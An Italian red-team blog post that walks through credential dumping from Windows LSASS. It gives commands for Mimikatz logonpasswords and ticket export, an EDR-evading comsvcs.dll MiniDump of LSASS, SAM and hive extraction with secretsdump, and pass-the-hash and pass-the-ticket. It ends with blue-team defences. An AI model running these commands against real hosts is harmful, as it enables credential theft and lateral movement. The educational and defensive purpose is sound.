---
layout: post
title: "Mimikatz e Credential Dumping: estrarre credenziali dalla memoria di Windows"
date: 2026-08-24
cat: red
tags: [Mimikatz, credential dumping, LSASS, Windows, post-exploitation, red team]
excerpt: "Windows tiene credenziali e hash in memoria per rendere fluido il Single Sign-On. Mimikatz e gli strumenti di credential dumping sfruttano esattamente questo — con conseguenze che vanno ben oltre un singolo host."
---

Quando un utente si autentica su Windows, il processo **LSASS** (Local Security Authority Subsystem Service) mantiene in memoria credenziali, hash NTLM e ticket Kerberos — necessari per il Single Sign-On, così l'utente non deve reinserire la password ad ogni servizio. Chi ottiene accesso amministrativo a un host può leggere quella memoria ed estrarne il contenuto.

## Cosa vive in LSASS

- **Hash NTLM** degli utenti autenticati sulla macchina
- **Ticket Kerberos** (TGT e TGS) già emessi
- **Credenziali in chiaro**, se WDigest è abilitato (retaggio storico, ancora presente in molte reti legacy)
- **DPAPI master key**, usate per decifrare credenziali salvate (browser, RDP, Wi-Fi)

## Dumping con Mimikatz

```powershell
# Richiede privilegi SeDebugPrivilege / amministratore locale
mimikatz.exe

privilege::debug
sekurlsa::logonpasswords   # hash NTLM e, se presenti, password in chiaro
sekurlsa::tickets /export  # esporta i ticket Kerberos in memoria
lsadump::sam               # hash locali dal database SAM
```

L'output di `sekurlsa::logonpasswords` include, per ogni sessione attiva, dominio, utente, hash NTLM e — se WDigest è ancora abilitato — la password in chiaro.

## Dumping senza Mimikatz (spesso più silenzioso)

EDR moderni riconoscono la firma di Mimikatz quasi universalmente. Tecniche alternative:

```powershell
# Dump di LSASS via Task Manager (nessun binario esterno)
# Task Manager -> Dettagli -> lsass.exe -> Crea file di dump

# comsvcs.dll — LOLBin nativo di Windows
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID_lsass> lsass.dmp full

# Analisi offline del dump con pypykatz (non serve toccare l'host target)
pypykatz lsa minidump lsass.dmp
```

Dumpare offline e analizzare altrove riduce drasticamente l'impronta sull'host compromesso — nessun binario noto eseguito, nessun hook di sekurlsa da rilevare in tempo reale.

## Oltre LSASS: NTDS.dit e SAM

```bash
# Copia del database SAM locale (richiede accesso SYSTEM)
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

# Estrazione NTDS.dit da un Domain Controller (via VSS o DCSync — vedi articolo su Golden Ticket)
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

## Pass-the-Hash e Pass-the-Ticket

Una volta ottenuto l'hash o il ticket, non serve mai la password in chiaro:

```bash
# Pass-the-hash
evil-winrm -i 10.10.10.5 -u Administrator -H <hash_ntlm>

# Pass-the-ticket — riutilizza un ticket Kerberos esportato
mimikatz # kerberos::ptt ticket.kirbi
```

## Come si difende un blue team

- **Credential Guard**: isola LSASS in un container virtualizzato separato dal kernel, impedendo l'estrazione diretta dell'hash anche con privilegi SYSTEM
- **Disabilitare WDigest** (`UseLogonCredential = 0`) — elimina le password in chiaro da LSASS
- **Protected Process Light (PPL)** su LSASS — blocca l'accesso da processi non firmati/autorizzati
- **Restricted Admin Mode** e **Protected Users group** per limitare la persistenza di credenziali riutilizzabili
- **EDR con detection comportamentale** su accesso a `lsass.exe` (`OpenProcess` con `PROCESS_VM_READ`), non solo su firme statiche di Mimikatz

## Conclusione

Il credential dumping non è un exploit — è l'uso di una funzionalità di sistema (il caching delle credenziali per il SSO) fuori dal suo scopo previsto. Le difese più efficaci non "bloccano Mimikatz": rendono le credenziali stesse inutilizzabili anche quando finiscono in mani sbagliate.
